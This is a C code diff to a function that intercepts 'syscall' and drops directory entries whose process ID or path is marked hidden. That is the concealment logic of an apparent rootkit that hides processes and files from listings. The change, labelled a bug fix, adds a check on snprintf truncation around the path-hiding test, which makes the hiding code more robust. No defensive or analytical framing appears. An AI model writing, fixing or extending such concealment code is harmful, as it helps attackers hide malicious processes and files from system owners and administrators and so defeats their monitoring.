@@ -221,11 +221,16 @@ long syscall(long number, ...) {
             if (pid > 0 && is_pid_hidden(pid)) {
                 should_hide = 1;
             } else {
+                // BUG FIX: Use a more robust method to prevent truncation warnings.
+                // We now check the return value of snprintf to ensure the full path was written.
                 char full_path[PATH_MAX];
-                snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, current_entry->d_name);
+                int path_needed = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, current_entry->d_name);
                 
-                if (should_hide_path(full_path)) {
-                    should_hide = 1;
+                // Check if snprintf was successful and did not truncate the path.
+                if (path_needed > 0 && (size_t)path_needed < sizeof(full_path)) {
+                    if (should_hide_path(full_path)) {
+                        should_hide = 1;
+                    }
                 }
             }
 
